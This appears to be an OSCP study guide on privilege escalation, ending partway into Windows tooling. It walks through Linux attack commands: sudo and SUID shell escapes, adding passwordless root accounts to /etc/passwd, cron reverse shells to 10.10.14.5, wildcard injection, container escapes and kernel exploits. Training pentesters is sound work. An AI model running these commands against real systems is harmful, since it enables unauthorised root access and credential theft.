
# Privilege Escalation Master Guide: From User to Root/SYSTEM

## 📋 Executive Summary

**OSCP Relevance**: ⭐⭐⭐⭐⭐ (99% - THE MOST CRITICAL SKILL)

Privilege escalation (PrivEsc) is **40% of your OSCP exam score**. You can get initial shells on all 5 machines, but if you can't escalate privileges, you'll fail.

**Why 99% Relevance?**:
- **OSCP Exam**: Every machine requires PrivEsc (low-privilege shell → root/SYSTEM)
- **Real Pentesting**: Initial access is usually limited; PrivEsc proves full compromise
- **Interview Questions**: "How do you escalate on Linux/Windows?" - Asked in 90% of security interviews

**For Fresh Graduates**: This skill separates "script kiddies" from real penetration testers. Master this, and you're job-ready.

**What You'll Learn**:
1. Privilege escalation fundamentals (what, why, how)
2. Linux PrivEsc - 20+ techniques (SUID, sudo, capabilities, kernel exploits)
3. Windows PrivEsc - 20+ techniques (tokens, services, registry, scheduled tasks)
4. Automated enumeration tools (LinPEAS, WinPEAS, linux-smart-enumeration)
5. Manual enumeration checklists
6. GTFOBins exploitation mastery
7. LOLBAS (Windows Living Off The Land)
8. 3+ complete OSCP scenarios (from shell to root)
9. Defense strategies (how to prevent PrivEsc)
10. Interview preparation (common PrivEsc questions)

**Time Investment**: 40-50 hours for OSCP mastery

**OSCP Strategy**: Spend 50% of your lab time practicing PrivEsc. Get shells easily, but PrivEsc is where you earn points.

---

## 🎓 ABSOLUTE BEGINNER: What is Privilege Escalation?

### The Office Building Analogy

Imagine you've entered a corporate office building:

**Phase 1: Initial Access (Foothold)**
- You're a **delivery person** with a temporary badge
- Can access: Lobby, cafeteria, public restrooms
- Cannot access: Executive offices, server room, CEO's computer
- **In hacking**: You have a low-privilege shell (www-data, IIS AppPool, standard user)

**Phase 2: Privilege Escalation**
- You find a **janitor's master keycard** left on a desk
- Suddenly you can access: All floors, restricted areas, IT closets
- **In hacking**: You escalate from `www-data` → `root` or `user` → `SYSTEM`

**Phase 3: Full Compromise**
- With master access, you can:
  - Read all files (financial records, passwords)
  - Install persistent backdoors (cameras, keyloggers)
  - Control the entire building
- **In hacking**: Read `/etc/shadow`, dump password hashes, install rootkits

### Real-World Example

**Scenario**: You exploited a web vulnerability and got a shell:

```bash
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ cat /root/flag.txt
cat: /root/flag.txt: Permission denied  ❌

$ sudo -l
Sorry, user www-data may not run sudo on this system.  ❌
```

**Problem**: You have a shell, but you're a low-privilege user. You need to become `root`.

**Solution**: Find a privilege escalation vector:
```bash
# Search for SUID binaries
$ find / -perm -4000 2>/dev/null
/usr/bin/python3.9  ← Python with SUID? That's exploitable!

# Exploit SUID Python
$ /usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Now you're root!
$ whoami
root  ✅

$ cat /root/flag.txt
OSCP{Pr1v3sc_M4st3r_99}  ✅
```

### Why Privilege Escalation Matters

**In OSCP Exam**:
- 5 machines (25 points each)
- 10 points for low-privilege shell (user flag)
- 15 points for privilege escalation (root flag)
- **Without PrivEsc**: Maximum 50 points = FAIL ❌
- **With PrivEsc**: 125 points = PASS ✅

**In Real Penetration Testing**:
- Client: "So you got a web shell as www-data. So what?"
- You: "I escalated to root and can read all user data, including admin passwords."
- Client: "Oh. That's a critical finding." 💰

---

## 🐧 LINUX PRIVILEGE ESCALATION

### Overview: The Linux Permission Model

```
┌─────────────────────────────────────────────────────────────┐
│              LINUX PRIVILEGE HIERARCHY                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────────────────────────────┐                  │
│  │           ROOT (UID 0)               │                  │
│  │  • Can do ANYTHING                   │                  │
│  │  • Read all files                    │                  │
│  │  • Modify system configs             │                  │
│  │  • Install software                  │                  │
│  │  • Kill any process                  │                  │
│  └──────────────────────────────────────┘                  │
│                    ▲                                        │
│                    │ PRIVILEGE ESCALATION                   │
│                    │                                        │
│  ┌──────────────────────────────────────┐                  │
│  │      PRIVILEGED USERS                │                  │
│  │  • sudo access (limited)             │                  │
│  │  • Can run specific commands as root│                  │
│  │  • Example: sudo apt update          │                  │
│  └──────────────────────────────────────┘                  │
│                    ▲                                        │
│                    │                                        │
│  ┌──────────────────────────────────────┐                  │
│  │      STANDARD USERS                  │                  │
│  │  • Own home directory                │                  │
│  │  • Can run programs                  │                  │
│  │  • Can read world-readable files     │                  │
│  │  • Cannot modify system              │                  │
│  └──────────────────────────────────────┘                  │
│                    ▲                                        │
│                    │ INITIAL ACCESS                         │
│  ┌──────────────────────────────────────┐                  │
│  │   SERVICE ACCOUNTS (www-data, mysql) │                  │
│  │  • Very limited permissions          │                  │
│  │  • Can only access specific dirs     │                  │
│  │  • No login shell (usually)          │                  │
│  │  • No sudo rights                    │                  │
│  └──────────────────────────────────────┘                  │
│            ← YOU START HERE (OSCP)                          │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔍 1. Linux Enumeration (Information Gathering)

### 1.1 Manual Enumeration Checklist

**The first 5 minutes on any Linux box**:

```bash
# ═══════════════════════════════════════════════════════════
# BASIC SYSTEM INFORMATION
# ═══════════════════════════════════════════════════════════

# Who am I?
whoami
id
groups

# What system is this?
hostname
uname -a
cat /etc/os-release
cat /etc/issue

# What's running?
ps aux
ps aux | grep root  # Root processes

# ═══════════════════════════════════════════════════════════
# SUDO PRIVILEGES (HIGHEST PRIORITY)
# ═══════════════════════════════════════════════════════════

# Can I run anything as root?
sudo -l

# Example output:
# User john may run the following commands on target:
#     (root) NOPASSWD: /usr/bin/vim
# ↑ INSTANT ROOT! (GTFOBins: sudo vim -c ':!/bin/bash')

# ═══════════════════════════════════════════════════════════
# SUID/SGID BINARIES (SECOND PRIORITY)
# ═══════════════════════════════════════════════════════════

# Find SUID binaries (run with owner's permissions)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Common exploitable SUID binaries:
# • /usr/bin/python
# • /usr/bin/perl
# • /usr/bin/find
# • /usr/bin/vim
# • /usr/bin/less
# • /usr/bin/more
# • /usr/bin/nano
# • /usr/bin/cp
# • /bin/bash

# ═══════════════════════════════════════════════════════════
# CAPABILITIES (LINUX 2.6+)
# ═══════════════════════════════════════════════════════════

# Check for file capabilities
getcap -r / 2>/dev/null

# Example dangerous capability:
# /usr/bin/python3.8 = cap_setuid+ep
# ↑ Can set UID to 0 (root)!

# ═══════════════════════════════════════════════════════════
# CRON JOBS (SCHEDULED TASKS)
# ═══════════════════════════════════════════════════════════

# System-wide cron
cat /etc/crontab
ls -la /etc/cron.*

# User cron
crontab -l

# Check running cron processes
ps aux | grep cron

# Look for writable cron scripts
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/

# ═══════════════════════════════════════════════════════════
# WRITABLE FILES & DIRECTORIES
# ═══════════════════════════════════════════════════════════

# Find world-writable files
find / -perm -2 -type f 2>/dev/null

# Find world-writable directories
find / -perm -2 -type d 2>/dev/null

# Check if /etc/passwd is writable (jackpot!)
ls -la /etc/passwd

# ═══════════════════════════════════════════════════════════
# SENSITIVE FILES
# ═══════════════════════════════════════════════════════════

# Password files
cat /etc/passwd
cat /etc/shadow  # Need root (usually)
cat /etc/group

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# History files (passwords in cleartext?)
cat ~/.bash_history
cat /root/.bash_history 2>/dev/null
find / -name .bash_history 2>/dev/null

# Config files
find / -name "*.conf" 2>/dev/null | xargs grep -i password 2>/dev/null

# Backup files
find / -name "*.bak" 2>/dev/null
find / -name "*backup*" 2>/dev/null

# ═══════════════════════════════════════════════════════════
# NETWORK INFORMATION
# ═══════════════════════════════════════════════════════════

# Network configuration
ifconfig
ip addr

# Listening services
netstat -tulpn
ss -tulpn

# Firewall rules
iptables -L

# ═══════════════════════════════════════════════════════════
# INSTALLED SOFTWARE
# ═══════════════════════════════════════════════════════════

# Debian/Ubuntu
dpkg -l
apt list --installed

# Red Hat/CentOS
rpm -qa
yum list installed

# Check for outdated/vulnerable software
uname -r  # Kernel version (search for exploits)

# ═══════════════════════════════════════════════════════════
# KERNEL EXPLOITS (LAST RESORT - RISKY)
# ═══════════════════════════════════════════════════════════

# Kernel version
uname -a

# Search for kernel exploits:
# Google: "Linux kernel [version] privilege escalation"
# Example: Linux kernel 2.6.32 → DirtyCow exploit
```

### 1.2 Automated Enumeration Tools

**Use these to save time, but understand manual enumeration first!**

```bash
# ═══════════════════════════════════════════════════════════
# 1. LINPEAS (Linux Privilege Escalation Awesome Script)
# ═══════════════════════════════════════════════════════════
# Download: https://github.com/carlospolop/PEASS-ng/releases

# Transfer to target
wget http://10.10.14.5/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Output highlights:
# • 95% chance = RED/YELLOW (exploit this!)
# • SUID binaries
# • Sudo misconfigurations
# • Writable files
# • Credentials in files

# ═══════════════════════════════════════════════════════════
# 2. LINUX SMART ENUMERATION (LSE)
# ═══════════════════════════════════════════════════════════
# Download: https://github.com/diego-treitos/linux-smart-enumeration

wget http://10.10.14.5/lse.sh
chmod +x lse.sh
./lse.sh -l 2  # Level 2 (more checks)

# ═══════════════════════════════════════════════════════════
# 3. LINENUM
# ═══════════════════════════════════════════════════════════
# Download: https://github.com/rebootuser/LinEnum

wget http://10.10.14.5/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# ═══════════════════════════════════════════════════════════
# 4. LINUX EXPLOIT SUGGESTER
# ═══════════════════════════════════════════════════════════
# Suggests kernel exploits based on kernel version

wget http://10.10.14.5/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# ═══════════════════════════════════════════════════════════
# 5. PSPY (Process Monitoring - No Root Required)
# ═══════════════════════════════════════════════════════════
# Monitors processes without root (finds cron jobs)

wget http://10.10.14.5/pspy64
chmod +x pspy64
./pspy64

# Watch for:
# • Root processes that run scripts
# • Scripts you can modify
# • Scripts that use wildcards (wildcard injection)
```

---

## 🚀 2. Linux Privilege Escalation Techniques

### Technique 1: Sudo Abuse (EASIEST & MOST COMMON)

**What is it?**: User can run specific commands as root without password.

**How to find**:
```bash
sudo -l
```

**Example Output**:
```
User john may run the following commands on target:
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/find
```

**Exploitation**:

```bash
# ══════════════════════════════════════════════════════════
# SCENARIO 1: sudo vim
# ══════════════════════════════════════════════════════════
sudo vim

# Inside vim, press ESC and type:
:!/bin/bash

# You're now root!
whoami  # root

# ══════════════════════════════════════════════════════════
# SCENARIO 2: sudo find
# ══════════════════════════════════════════════════════════
sudo find /etc -exec /bin/bash \;

# ══════════════════════════════════════════════════════════
# SCENARIO 3: sudo python
# ══════════════════════════════════════════════════════════
sudo python -c 'import os; os.system("/bin/bash")'

# ══════════════════════════════════════════════════════════
# SCENARIO 4: sudo less/more/man
# ══════════════════════════════════════════════════════════
sudo less /etc/passwd

# Inside less, type:
!/bin/bash

# ══════════════════════════════════════════════════════════
# SCENARIO 5: sudo awk
# ══════════════════════════════════════════════════════════
sudo awk 'BEGIN {system("/bin/bash")}'

# ══════════════════════════════════════════════════════════
# SCENARIO 6: sudo nmap (older versions)
# ══════════════════════════════════════════════════════════
sudo nmap --interactive
nmap> !sh

# ══════════════════════════════════════════════════════════
# SCENARIO 7: sudo env (CVE-2019-14287)
# ══════════════════════════════════════════════════════════
# If sudo config is: (ALL, !root) /bin/bash
# Bypass with UID -1:
sudo -u#-1 /bin/bash

# ══════════════════════════════════════════════════════════
# GTFOBins: THE BIBLE FOR SUDO EXPLOITS
# ══════════════════════════════════════════════════════════
# Visit: https://gtfobins.github.io/

# Search for any binary you can sudo
# Example: sudo -l shows /usr/bin/zip
# GTFOBins → zip → Sudo → Copy command → Root!
```

---

### Technique 2: SUID Binaries

**What is SUID?**: File runs with owner's permissions (not caller's).

**Example**:
```bash
-rwsr-xr-x 1 root root 12345 /usr/bin/passwd
   ↑
   This 's' means SUID is set
   
When you run /usr/bin/passwd, it runs as ROOT (owner)
even though you're a normal user
```

**Finding SUID Binaries**:
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Common Exploitable SUID Binaries**:

```bash
# ══════════════════════════════════════════════════════════
# 1. PYTHON WITH SUID
# ══════════════════════════════════════════════════════════
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# ══════════════════════════════════════════════════════════
# 2. BASH WITH SUID
# ══════════════════════════════════════════════════════════
/bin/bash -p  # -p = don't drop privileges

# ══════════════════════════════════════════════════════════
# 3. FIND WITH SUID
# ══════════════════════════════════════════════════════════
find /home -exec /bin/bash -p \;

# ══════════════════════════════════════════════════════════
# 4. VIM WITH SUID
# ══════════════════════════════════════════════════════════
vim -c ':!/bin/bash'

# ══════════════════════════════════════════════════════════
# 5. LESS WITH SUID
# ══════════════════════════════════════════════════════════
less /etc/passwd
!/bin/bash

# ══════════════════════════════════════════════════════════
# 6. NMAP WITH SUID (old versions)
# ══════════════════════════════════════════════════════════
nmap --interactive
nmap> !sh

# ══════════════════════════════════════════════════════════
# 7. CP WITH SUID (Overwrite /etc/passwd)
# ══════════════════════════════════════════════════════════
# Create malicious passwd with root user (no password)
echo 'hacker::0:0:root:/root:/bin/bash' > /tmp/passwd

# Overwrite /etc/passwd
cp /tmp/passwd /etc/passwd

# Switch to root
su hacker  # No password needed!

# ══════════════════════════════════════════════════════════
# 8. SYSTEMCTL WITH SUID
# ══════════════════════════════════════════════════════════
# Create malicious service
cat > /tmp/root.service << EOF
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'chmod +s /bin/bash'
[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl link /tmp/root.service
systemctl enable --now /tmp/root.service

# Bash is now SUID
/bin/bash -p

# ══════════════════════════════════════════════════════════
# 9. CUSTOM SUID BINARY (Reverse Engineering)
# ══════════════════════════════════════════════════════════
# If you find a custom SUID binary:
ls -la /usr/local/bin/custom_suid

# Check what it does
strings /usr/local/bin/custom_suid

# Look for:
# • system() calls
# • Relative paths (path hijacking)
# • Buffer overflows
# • Environment variable use
```

**SUID Exploitation Pattern**:
```
1. Find SUID binary: find / -perm -4000
2. Search GTFOBins: gtfobins.github.io
3. If custom binary: strings + reverse engineer
4. Exploit!
```

---

### Technique 3: Capabilities

**What are Capabilities?**: Fine-grained permissions (alternative to SUID).

**Finding Capabilities**:
```bash
getcap -r / 2>/dev/null
```

**Example Output**:
```
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

**Dangerous Capabilities**:

```bash
# ══════════════════════════════════════════════════════════
# 1. cap_setuid (Can change UID to 0 = root)
# ══════════════════════════════════════════════════════════
# If python has cap_setuid:
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# ══════════════════════════════════════════════════════════
# 2. cap_dac_read_search (Bypass file read permissions)
# ══════════════════════════════════════════════════════════
# Can read any file!
# If tar has this capability:
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow  # Root password hashes!

# ══════════════════════════════════════════════════════════
# 3. cap_dac_override (Bypass file write permissions)
# ══════════════════════════════════════════════════════════
# Can write to any file!

# ══════════════════════════════════════════════════════════
# 4. cap_sys_admin (Almost full root)
# ══════════════════════════════════════════════════════════
# Can mount filesystems, manipulate namespaces, etc.
```

**Capability Escalation Example**:
```bash
# Find cap_setuid on python
$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid+ep

# Exploit
$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Root!
# whoami
root
```

---

### Technique 4: Cron Jobs

**What are Cron Jobs?**: Scheduled tasks that run automatically.

**Why they're exploitable**: If a cron job runs as root and uses a writable script, you can inject commands.

**Finding Cron Jobs**:
```bash
# System-wide cron
cat /etc/crontab

# User cron
crontab -l

# Monitor processes (pspy)
./pspy64
```

**Example Vulnerable Cron**:
```bash
# /etc/crontab contains:
* * * * * root /home/user/backup.sh
              ↑
              Runs as root every minute!
              
# Check if you can write to backup.sh
ls -la /home/user/backup.sh
-rwxrwxrwx 1 root root 123 /home/user/backup.sh
    ↑
    World-writable! You can modify it!
```

**Exploitation**:
```bash
# ══════════════════════════════════════════════════════════
# METHOD 1: Add reverse shell to script
# ══════════════════════════════════════════════════════════
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /home/user/backup.sh

# Start listener
nc -lvnp 4444

# Wait for cron to execute (max 1 minute)
# Receive root shell!

# ══════════════════════════════════════════════════════════
# METHOD 2: Make bash SUID
# ══════════════════════════════════════════════════════════
echo 'chmod +s /bin/bash' >> /home/user/backup.sh

# Wait for cron
# ...

# Check bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1234 /bin/bash

# Get root shell
/bin/bash -p

# ══════════════════════════════════════════════════════════
# METHOD 3: Add new root user to /etc/passwd
# ══════════════════════════════════════════════════════════
echo 'echo "hacker::0:0:root:/root:/bin/bash" >> /etc/passwd' >> /home/user/backup.sh

# Wait for cron
# ...

# Switch to new root user
su hacker  # No password!
```

**Wildcard Injection in Cron**:
```bash
# ══════════════════════════════════════════════════════════
# If cron contains wildcards:
# ══════════════════════════════════════════════════════════
# /etc/crontab:
* * * * * root cd /home/user && tar czf /tmp/backup.tar.gz *

# Exploit wildcard:
cd /home/user
echo 'chmod +s /bin/bash' > shell.sh
chmod +x shell.sh

# Create malicious filenames (tar interprets as flags)
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# When cron runs:
# tar czf /tmp/backup.tar.gz * 
# Becomes:
# tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh [files]
# Executes shell.sh as root!
```

---

### Technique 5: Writable /etc/passwd

**What is /etc/passwd?**: User account database.

**Format**:
```
username:password:UID:GID:comment:home:shell
root:x:0:0:root:/root:/bin/bash
  ↑  ↑ ↑
  |  | User ID (0 = root)
  |  Password (x = stored in /etc/shadow)
  Username
```

**If /etc/passwd is writable**, you can add a root user!

**Check Permissions**:
```bash
ls -la /etc/passwd
-rw-rw-rw- 1 root root 1234 /etc/passwd
    ↑
    World-writable! (misconfiguration)
```

**Exploitation**:
```bash
# ══════════════════════════════════════════════════════════
# METHOD 1: Add root user with no password
# ══════════════════════════════════════════════════════════
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
         ↑
         Empty password field

# Switch to root
su hacker
# No password prompt!

# whoami
root

# ══════════════════════════════════════════════════════════
# METHOD 2: Add root user with password
# ══════════════════════════════════════════════════════════
# Generate password hash
openssl passwd -1 -salt abc password123
# Output: $1$abc$qwerty123...

# Add to /etc/passwd
echo 'hacker:$1$abc$qwerty123...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su hacker
Password: password123

# ══════════════════════════════════════════════════════════
# METHOD 3: Modify existing user's UID to 0
# ══════════════════════════════════════════════════════════
# Original:
# john:x:1000:1000:john:/home/john:/bin/bash

# Change UID to 0:
sed -i 's/john:x:1000/john:x:0/' /etc/passwd

# Now john is effectively root!
su john
# You're root!
```

---

### Technique 6: Kernel Exploits (LAST RESORT)

**Warning**: Kernel exploits can **crash the system**. Only use in OSCP exam if no other method works.

**Finding Kernel Version**:
```bash
uname -a
# Linux target 2.6.32-5-amd64 #1 SMP x86_64 GNU/Linux
```

**Searching for Exploits**:
```bash
# Use Linux Exploit Suggester
./linux-exploit-suggester.sh

# Manual search:
# Google: "Linux kernel 2.6.32 privilege escalation exploit"
# SearchSploit: searchsploit linux kernel 2.6
```

**Famous Kernel Exploits**:

```bash
# ══════════════════════════════════════════════════════════
# 1. DIRTY COW (CVE-2016-5195)
# ══════════════════════════════════════════════════════════
# Affects: Linux kernel 2.6.22 - 4.8.3
# Download: https://github.com/firefart/dirtycow

gcc -pthread dirty.c -o dirty -lcrypt
./dirty password123

# Creates "firefart" user with UID 0
su firefart
Password: password123

# ══════════════════════════════════════════════════════════
# 2. OVERLAYFS (CVE-2015-1328)
# ══════════════════════════════════════════════════════════
# Affects: Ubuntu 12.04, 14.04, 15.04
# Download from ExploitDB

gcc ofs.c -o ofs
./ofs
# Instant root!

# ══════════════════════════════════════════════════════════
# 3. PwnKit (CVE-2021-4034)
# ══════════════════════════════════════════════════════════
# Affects: PolicyKit (pkexec) on most Linux distros
# Download: https://github.com/arthepsy/CVE-2021-4034

make
./cve-2021-4034

# ══════════════════════════════════════════════════════════
# 4. SUDO BARON SAMEDIT (CVE-2021-3156)
# ══════════════════════════════════════════════════════════
# Affects: sudo < 1.9.5p2

# Check if vulnerable:
sudoedit -s /
# If you see "sudoedit:" → vulnerable!

# Download exploit from GitHub
./exploit

# ══════════════════════════════════════════════════════════
# 5. NETFILTER (CVE-2021-22555)
# ══════════════════════════════════════════════════════════
# Affects: Linux kernel < 5.11.15
# Local privilege escalation
```

**OSCP Kernel Exploit Strategy**:
1. Try all other methods first
2. If stuck after 1 hour, consider kernel exploit
3. Always test in Kali VM first (to avoid crashes)
4. Have a backup plan if system crashes

---

### Technique 7: PATH Hijacking

**What is PATH?**: Environment variable that tells Linux where to find executables.

**Vulnerable Scenario**: SUID binary calls a command without full path.

**Example**:
```bash
# Vulnerable SUID binary: /usr/local/bin/backup
# Source code:
system("tar czf /tmp/backup.tar.gz /home/user");
       ↑
       Uses "tar" without full path (/bin/tar)
       Searches PATH to find "tar"
```

**Exploitation**:
```bash
# ══════════════════════════════════════════════════════════
# STEP 1: Check current PATH
# ══════════════════════════════════════════════════════════
echo $PATH
/usr/local/bin:/usr/bin:/bin

# ══════════════════════════════════════════════════════════
# STEP 2: Create malicious "tar" script
# ══════════════════════════════════════════════════════════
cd /tmp
cat > tar << EOF
#!/bin/bash
/bin/bash -p
EOF

chmod +x tar

# ══════════════════════════════════════════════════════════
# STEP 3: Prepend /tmp to PATH
# ══════════════════════════════════════════════════════════
export PATH=/tmp:$PATH

echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin
 ↑
 Now /tmp/tar will be found BEFORE /bin/tar!

# ══════════════════════════════════════════════════════════
# STEP 4: Run vulnerable SUID binary
# ══════════════════════════════════════════════════════════
/usr/local/bin/backup

# It calls "tar", finds /tmp/tar, executes as root!
# Root shell!
```

---

### Technique 8: NFS No_Root_Squash

**What is NFS?**: Network File System - share directories over network.

**What is no_root_squash?**: NFS config that allows root on client to be root on server.

**Finding NFS Exports**:
```bash
# On target
cat /etc/exports

# Example output:
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
      ↑
      no_root_squash = VULNERABLE!
```

**Exploitation** (from attacker machine):

```bash
# ══════════════════════════════════════════════════════════
# STEP 1: Check NFS shares (from Kali)
# ══════════════════════════════════════════════════════════
showmount -e 192.168.1.50
# Export list for 192.168.1.50:
# /tmp *

# ══════════════════════════════════════════════════════════
# STEP 2: Mount NFS share
# ══════════════════════════════════════════════════════════
mkdir /tmp/nfs
mount -t nfs 192.168.1.50:/tmp /tmp/nfs

# ══════════════════════════════════════════════════════════
# STEP 3: Create SUID bash (as root on Kali)
# ══════════════════════════════════════════════════════════
cd /tmp/nfs
cp /bin/bash .
chmod +s bash

ls -la bash
-rwsr-sr-x 1 root root 1234 bash
    ↑
    SUID bit set!

# ══════════════════════════════════════════════════════════
# STEP 4: Execute SUID bash on target
# ══════════════════════════════════════════════════════════
# On target:
cd /tmp
./bash -p

# Root!
whoami
root
```

---

### Technique 9: LXD/LXC Group Membership

**What is LXD?**: Linux container manager (like Docker).

**Vulnerability**: Members of `lxd` group can create containers with root filesystem mounted.

**Check if Vulnerable**:
```bash
id
# uid=1000(john) gid=1000(john) groups=1000(john),108(lxd)
                                                    ↑
                                             Member of lxd group!
```

**Exploitation**:

```bash
# ══════════════════════════════════════════════════════════
# STEP 1: Build Alpine container (on Kali)
# ══════════════════════════════════════════════════════════
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine

# Creates: alpine-v3.xx-x86_64-YYYYMMDD_HHMM.tar.gz

# ══════════════════════════════════════════════════════════
# STEP 2: Transfer to target
# ══════════════════════════════════════════════════════════
# On Kali:
python3 -m http.server 80

# On target:
wget http://10.10.14.5/alpine-v3.xx-x86_64-YYYYMMDD_HHMM.tar.gz

# ══════════════════════════════════════════════════════════
# STEP 3: Import image and create container
# ══════════════════════════════════════════════════════════
lxc image import ./alpine-v3.xx-x86_64-YYYYMMDD_HHMM.tar.gz --alias myimage

# Initialize LXD (if not initialized)
lxd init  # Press Enter for all defaults

# Create container with root filesystem mounted
lxc init myimage ignited -c security.privileged=true
lxc config device add ignited mydevice disk source=/ path=/mnt/root recursive=true

# Start container
lxc start ignited

# ══════════════════════════════════════════════════════════
# STEP 4: Access container with root filesystem
# ══════════════════════════════════════════════════════════
lxc exec ignited /bin/sh

# You're in container as root!
# Host filesystem is at /mnt/root

cd /mnt/root/root
cat flag.txt  # Read root flag!

# Add SSH key for persistent access
cat /mnt/root/root/.ssh/id_rsa  # Steal root SSH key
```

---

### Technique 10: Docker Group Membership

**Similar to LXD escalation**.

**Check**:
```bash
id
# groups=1000(john),999(docker)
                        ↑
                  Member of docker group!
```

**Exploitation**:
```bash
# Mount host filesystem in container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# You're root on host system!
whoami
root

cd /root
cat flag.txt
```

---

## 🪟 WINDOWS PRIVILEGE ESCALATION

### Overview: Windows Security Model

```
┌─────────────────────────────────────────────────────────────┐
│            WINDOWS PRIVILEGE HIERARCHY                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────────────────────────────┐                  │
│  │      NT AUTHORITY\SYSTEM             │                  │
│  │  • Highest privilege (above Admin)   │                  │
│  │  • Can access all files              │                  │
│  │  • Can modify system services        │                  │
│  │  • No UAC prompts                    │                  │
│  └──────────────────────────────────────┘                  │
│                    ▲                                        │
│                    │ PRIVILEGE ESCALATION                   │
│                    │                                        │
│  ┌──────────────────────────────────────┐                  │
│  │      Administrators Group            │                  │
│  │  • Can install software              │                  │
│  │  • Can create users                  │                  │
│  │  • Can modify system (UAC prompts)   │                  │
│  └──────────────────────────────────────┘                  │
│                    ▲                                        │
│                    │                                        │
│  ┌──────────────────────────────────────┐                  │
│  │      Standard Users                  │                  │
│  │  • Can run programs                  │                  │
│  │  • Can modify own files              │                  │
│  │  • Cannot install software           │                  │
│  └──────────────────────────────────────┘                  │
│                    ▲                                        │
│                    │ INITIAL ACCESS                         │
│  ┌──────────────────────────────────────┐                  │
│  │   Service Accounts (IIS AppPool, etc)│                  │
│  │  • Very limited permissions          │                  │
│  │  • No interactive login              │                  │
│  │  • Restricted to specific services   │                  │
│  └──────────────────────────────────────┘                  │
│            ← YOU START HERE (OSCP)                          │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔍 3. Windows Enumeration

### 3.1 Manual Enumeration Checklist

```cmd
REM ═══════════════════════════════════════════════════════════
REM BASIC SYSTEM INFORMATION
REM ═══════════════════════════════════════════════════════════

REM Who am I?
whoami
whoami /priv
whoami /groups

REM System info
systeminfo
hostname

REM OS version
ver

REM Network info
ipconfig /all
netstat -ano

REM ═══════════════════════════════════════════════════════════
REM USER & GROUP ENUMERATION
REM ═══════════════════════════════════════════════════════════

REM List users
net user
net user administrator
net user [username]

REM List groups
net localgroup
net localgroup administrators

REM ═══════════════════════════════════════════════════════════
REM PRIVILEGE TOKENS (CRITICAL)
REM ═══════════════════════════════════════════════════════════

whoami /priv

REM Look for:
REM SeImpersonatePrivilege  → PrintSpoofer, JuicyPotato
REM SeAssignPrimaryTokenPrivilege → PrintSpoofer
REM SeBackupPrivilege → Backup files as SYSTEM
REM SeRestorePrivilege → Restore files as SYSTEM
REM SeDebugPrivilege → Debug running processes

REM ═══════════════════════════════════════════════════════════
REM SERVICES (HIGH PRIORITY)
REM ═══════════════════════════════════════════════════════════

REM List all services
sc query
wmic service list brief

REM Find services you can modify
sc qc [service_name]

REM Check service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *

REM ═══════════════════════════════════════════════════════════
REM SCHEDULED TASKS
REM ═══════════════════════════════════════════════════════════

schtasks /query /fo LIST /v

REM ═══════════════════════════════════════════════════════════
REM FILE & FOLDER PERMISSIONS
REM ═══════════════════════════════════════════════════════════

REM Check Program Files permissions
icacls "C:\Program Files"
icacls "C:\Program Files (x86)"

REM Find writable directories
accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\
accesschk.exe /accepteula -uwdqs Users C:\

REM ═══════════════════════════════════════════════════════════
REM REGISTRY AUTOLOGON CREDENTIALS
REM ═══════════════════════════════════════════════════════════

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

REM ═══════════════════════════════════════════════════════════
REM PASSWORD HUNTING
REM ═══════════════════════════════════════════════════════════

REM Search for passwords in files
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.config

REM Common locations
type C:\unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml

REM ═══════════════════════════════════════════════════════════
REM INSTALLED SOFTWARE
REM ═══════════════════════════════════════════════════════════

wmic product get name,version,vendor
dir /s *.exe

REM Check for vulnerable software
REM Google: "[software name] [version] privilege escalation"

REM ═══════════════════════════════════════════════════════════
REM PATCH LEVEL
REM ═══════════════════════════════════════════════════════════

wmic qfe list
```

### 3.2 Automated Enumeration Tools

```powershell
# ═══════════════════════════════════════════════════════════
